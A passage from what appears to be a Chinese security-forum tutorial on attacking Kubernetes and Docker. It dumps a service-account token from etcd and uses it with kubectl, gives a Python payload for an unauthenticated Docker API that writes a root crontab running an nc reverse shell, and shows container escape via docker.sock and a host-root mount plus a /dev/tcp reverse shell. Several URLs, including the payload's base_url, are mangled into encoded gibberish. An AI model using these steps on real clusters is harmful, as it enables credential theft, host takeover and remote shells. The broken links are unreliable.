
![23fa635cccc1bb7bab065ee7f6b1f04d.png](https://bbs.kanxue.com/upload/attach/202205/809626_T5SPTTT2GJPEDGY.jpg)

## 获取token

```
/etcdctl --endpoints=https://127.0.0.1:2379/ get --keys-only --prefix=true "/" | grep /secrets/kube-system/clusterrole
```

![ca80720b59215838ed0f94b0c58e8068.png](https://bbs.kanxue.com/upload/attach/202205/809626_9PTGSVU7DEQAS9P.jpg)

![98010b9a55f49b263401fe4e62d9d8bc.png](https://bbs.kanxue.com/upload/attach/202205/809626_PX8BQCYUBY92YW7.jpg)

```
./etcdctl --endpoints=https://127.0.0.1:2379/ get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-fltzp
```

通过该`token`可以获取k8s集群的权限

```
kubectl --insecure-skip-tls-verify -s https://127.0.0.1:6443 --token="" -n kube-system get pods
```

![996098ae7a6ef402d429487bc3b1c3c6.png](https://bbs.kanxue.com/upload/attach/202205/809626_SQ889GCKDNSVB5X.jpg)

不过这里需要注意，在`kubectl` 1.2的版本没有`insecure-skip-tls-verify`这个参数

![image-20220508145028721](https://bbs.kanxue.com/upload/attach/202205/809626_PQPP8XZJDK9R7QH.jpg)

通过`kubectl` opthion也没有看到这个参数，但是我们在1.16.6版本中可以看到有这个参数

![63a62985b839e8dce6291f5f2074c7fc.png](https://bbs.kanxue.com/upload/attach/202205/809626_YMDMSHMWSB8FJRY.jpg)

![4c96c60eed61f7848b19f973f0c4c0cd.png](https://bbs.kanxue.com/upload/attach/202205/809626_MG84C5BEEQ4R8QN.jpg)

### 如何安装指定版本的kubectl

```
curl -LO "453K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8q4)9J5k6h3D9^5M7#2)9J5k6h3W2G2i4K6u0r3M7X3g2D9k6h3q4K6k6g2)9J5c8W2)9%4b7W2!0q4z5q4!0n7c8W2)9&6z5g2!0q4z5g2)9^5y4#2)9^5b7#2!0q4y4g2)9^5y4W2)9&6z5g2!0q4y4q4!0n7c8q4!0m8x3q4!0q4z5q4!0m8y4W2)9^5x3g2!0q4y4q4!0n7z5q4)9^5b7W2!0q4z5q4!0n7c8q4!0n7c8q4!0q4y4#2)9&6b7g2)9^5y4q4!0q4y4#2)9^5z5g2)9^5z5q4!0q4y4W2)9&6b7#2!0m8b7#2)9%4c8q4)9J5c8X3u0A6L8W2)9J5c8X3c8S2M7Y4N6A6L8W2)9J5c8X3q4E0k6o6j5@1i4K6u0r3K9%4g2T1k6h3y4@1L8l9."
# 例子
curl -LO "7a9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8q4)9J5k6h3D9^5M7#2)9J5k6h3W2G2i4K6u0r3M7X3g2D9k6h3q4K6k6g2)9J5c8Y4j5I4i4K6u0W2x3e0k6Q4x3X3f1$3i4K6u0r3j5X3W2F1i4K6u0r3k6r3q4J5N6$3W2F1i4K6u0r3j5h3#2V1y4U0c8Q4x3V1k6C8N6h3u0W2j5%4c8D9"
```

# 七、k8s+Docker会存在的问题

以下举例了两个docker会造成的问题，因为k8s+docker是比较常见的组合，所以docker上存在的问题，自然也会带到k8s中，更多docker逃逸到我的博客

- adfK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6#2P5Y4A6B7N6g2)9J5k6h3y4G2L8g2)9J5c8W2)9K6c8X3W2V1i4K6y4p5y4o6l9.

## 1、Docker API未授权

因为现在常见的搭配还是K8s+docker的组合，那么docker上存在的问题，在这个组合中也必然会存在

漏洞原理：在使用docker swarm的时候，节点上会开放一个TCP端口2375，绑定在0.0.0.0上，如果我们使用HTTP的方式访问会返回404 利用思路：通过挂在宿主机的目录，写定时任务获取SHELL，从而逃逸

![159875274e01300198a8b19aea8d4f1b.png](https://bbs.kanxue.com/upload/attach/202205/809626_K5ZRFP7FGMWPEQT.jpg)

![682f06268ee7970e1c3e87a0334f0eb6.png](https://bbs.kanxue.com/upload/attach/202205/809626_AE7M37CA75ZJQXD.jpg)

```
docker ps -a | grep rce
```

![c3aebdef75df8c4c0660726027429596.png](https://bbs.kanxue.com/upload/attach/202205/809626_YC6Z7T4EJEZCX6F.jpg)

访问`ip:2375/version`

![48852cf4de76a97f252ef9ee628d2179.png](https://bbs.kanxue.com/upload/attach/202205/809626_J9ZE6H8XRMENJKA.jpg)

**payload**

```
import docker
client = docker.DockerClient(base_url='f09K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8q4)9J5k6h3D9^5M7#2)9J5k6h3W2G2i4K6u0r3M7X3g2D9k6h3q4K6k6g2)9J5c8W2)9%4b7W2!0q4z5q4!0n7c8W2)9&6z5g2!0q4z5g2)9^5y4#2)9^5b7#2!0q4y4g2)9^5y4W2)9&6z5g2!0q4y4q4!0n7c8q4!0m8x3q4!0q4z5q4!0m8y4W2)9^5x3g2!0q4y4q4!0n7z5q4)9^5b7W2!0q4z5q4!0n7c8q4!0n7c8q4!0q4y4#2)9&6b7g2)9^5y4q4!0q4y4#2)9^5z5g2)9^5z5q4!0q4y4W2)9&6b7#2!0m8b7#2)9%4c8q4)9J5c8X3u0A6L8W2)9J5c8X3c8S2M7Y4N6A6L8W2)9J5c8X3q4E0k6o6j5@1i4K6u0r3K9%4g2T1k6h3y4@1L8l9.')
data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc 192.168.0.138 1234 -e /bin/sh' >> /tmp/etc/crontabs/root"''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
print(data)
```

![1e518b5fd5dfa75b5fb86766abe744d0.png](https://bbs.kanxue.com/upload/attach/202205/809626_4FD7XS98BGW9Z6G.jpg)

## 2、挂载docker.sock

### 2.1、什么是docker.sock

![61a823d41d2d3bf0911729d22d78fc84.png](https://bbs.kanxue.com/upload/attach/202205/809626_R8GK2NY2MDZJCRT.jpg)

`/var/run/docker.sock`是 Docker 守护程序默认监听的 Unix 套接字。它也是一个用于从容器内与 Docker 守护进程通信的工具

取自StackOverflow：Unix Sockets 术语套接字通常是指 IP 套接字。这些是绑定到端口（和地址）的端口，我们向其发送 TCP 请求并从中获取响应。

另一种类型的 Socket 是 Unix Socket，这些套接字用于 IPC（进程间通信）。它们也称为 Unix 域套接字（UDS）。Unix 套接字使用本地文件系统进行通信，而 IP 套接字使用网络。

Docker 守护进程可以通过三种不同类型的 Socket 监听 Docker Engine API 请求：unix, tcp, and fd. 默认情况下，在 `/var/run/docker.sock` 中创建一个 unix 域套接字（或 IPC 套接字）

### 2.2、创建docker

```
docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:18.04
```

![401eb30118e548e2332c56fe1b3f8e1a.png](https://bbs.kanxue.com/upload/attach/202205/809626_YB9CW2NM9HCUHYA.jpg)

随后在docker容器中安装docker

```
# ubuntu 18.04安装docker
sudo apt-get update
# 安装依赖包
sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common
# 添加 Docker 的官方 GPG 密钥
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
# 验证您现在是否拥有带有指纹的密钥
sudo apt-key fingerprint 0EBFCD88
# 设置稳定版仓库
sudo add-apt-repository "deb [arch=amd64] 7a4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8%4N6F1L8r3!0S2k6q4)9J5k6h3c8G2j5$3E0W2M7W2)9J5k6h3y4G2L8g2)9J5c8X3I4A6L8Y4g2^5i4K6u0r3N6h3u0#2L8Y4c8#2 $(lsb_release -cs) stable"
# 更新
$ sudo apt-get update
# 安装最新的Docker-ce
sudo apt-get install docker-ce
# 启动
sudo systemctl enable docker
sudo systemctl start docker
```

![a958e3dd569caa77f796d78fd63df88e.png](https://bbs.kanxue.com/upload/attach/202205/809626_G5K2G4N9H8BAUP8.jpg)

安装完成之后我们使用`docker ps`就可以看到宿主机上的容器了

### 2.3、复现

将宿主机的根目录挂载到容器

```
docker run -it -v /:/uzju ubuntu:18.04 /bin/bash
```

```
chroot uzju
```

![2f36ba1121b7e877ee41e10aa4239602.png](https://bbs.kanxue.com/upload/attach/202205/809626_4MNFV4VX56U6W6Y.jpg)

可以看到宿主机root目录上的图片，反弹shell也是修改`crontab`即可

### 2.4、反弹shell

通过修改Crontab定时任务来反弹shell

```
crontab -e
```

```
* * * * * /bin/bash -i >& /dev/tcp/192.168.0.139/123 0>&1
```

![068556ab6d5160c90d925bee95ab2e9e.png](https://bbs.kanxue.com/upload/attach/202205/809626_U9P8YNX7UD7BX4H.jpg)

![4b34102dc69232f5b171d40c3c339b84.png](https://bbs.kanxue.com/upload/attach/202205/809626_75WMD45MFX2594A.jpg)

# 参考

- [3e9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6k6h3y4#2M7X3W2@1P5g2)9J5k6i4c8W2L8X3y4W2L8Y4c8Q4x3X3g2U0L8$3#2Q4x3V1k6A6L8X3c8W2P5q4)9J5k6i4m8Z5M7q4)9J5c8X3u0D9L8$3N6Q4x3V1k6E0M7$3N6Q4x3V1j5I4z5o6x3.](https://bbs.kanxue.com/elink@62fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6k6h3y4#2M7X3W2@1P5g2)9J5k6i4c8W2L8X3y4W2L8Y4c8Q4x3X3g2U0L8$3#2Q4x3V1k6A6L8X3c8W2P5q4)9J5k6i4m8Z5M7q4)9J5c8X3u0D9L8$3N6Q4x3V1k6E0M7$3N6Q4x3V1j5I4z5o6x3.)

- [9beK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6B7j5i4k6S2L8h3q4F1j5g2)9J5k6h3y4G2L8g2)9J5c8U0t1H3x3U0u0Q4x3V1j5H3x3g2)9J5c8U0t1H3x3U0t1H3x3e0t1K6x3e0t1K6y4U0l9&6x3e0p5J5y4W2)9J5k6h3S2@1L8h3I4Q4x3U0y4C8N6h3u0W2M7X3&6W2N6r3g2K6i4K6g2X3x3b7.](https://bbs.kanxue.com/elink@a4fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6B7j5i4k6S2L8h3q4F1j5g2)9J5k6h3y4G2L8g2)9J5c8U0t1H3x3U0u0Q4x3V1j5H3x3g2)9J5c8U0t1H3x3U0t1H3x3e0t1K6x3e0t1K6y4U0l9&6x3e0p5J5y4W2)9J5k6h3S2@1L8h3I4Q4x3U0y4C8N6h3u0W2M7X3&6W2N6r3g2K6i4K6g2X3x3b7.)

- [1f1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6B7j5i4k6S2L8h3q4F1j5g2)9J5k6h3y4G2L8g2)9J5c8U0t1H3x3U0u0Q4x3V1j5H3x3g2)9J5c8U0t1H3x3U0t1H3x3e0t1K6x3e0t1K6y4U0l9&6x3e0p5J5y4W2)9J5k6h3S2@1L8h3I4Q4x3U0y4C8N6h3u0W2M7X3&6W2N6r3g2K6i4K6g2X3x3b7.](https://bbs.kanxue.com/elink@d2aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6B7j5i4k6S2L8h3q4F1j5g2)9J5k6h3y4G2L8g2)9J5c8U0t1H3x3U0u0Q4x3V1j5H3x3g2)9J5c8U0t1H3x3U0t1H3x3e0t1K6x3e0t1K6y4U0l9&6x3e0p5J5y4W2)9J5k6h3S2@1L8h3I4Q4x3U0y4C8N6h3u0W2M7X3&6W2N6r3g2K6i4K6g2X3x3b7.)
